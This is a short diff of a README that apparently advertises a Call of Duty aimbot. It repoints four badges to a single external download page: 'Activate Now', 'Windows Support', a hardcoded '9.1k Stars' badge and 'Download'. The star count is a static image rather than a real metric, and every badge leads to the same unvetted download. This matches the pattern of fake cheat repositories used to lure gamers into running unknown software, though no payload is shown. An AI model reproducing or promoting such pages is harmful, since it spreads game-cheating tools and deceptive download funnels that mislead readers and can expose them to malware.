@@ -11,10 +11,10 @@ Call of Duty is a game of milliseconds—missing a shot can cost the match. The 
 \[!WARNING]
 This tool is intended for **training and testing purposes**. Use responsibly and avoid online competitive environments.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 9.1k Stars](https://img.shields.io/badge/⭐️%209.1k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://call-of-duty-aimbot.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://call-of-duty-aimbot.github.io/.github/)
+[![⭐️ 9.1k Stars](https://img.shields.io/badge/⭐️%209.1k-Stars-yellow?style=for-the-badge\&logo=github)](https://call-of-duty-aimbot.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://call-of-duty-aimbot.github.io/.github/)
 
 
 ---
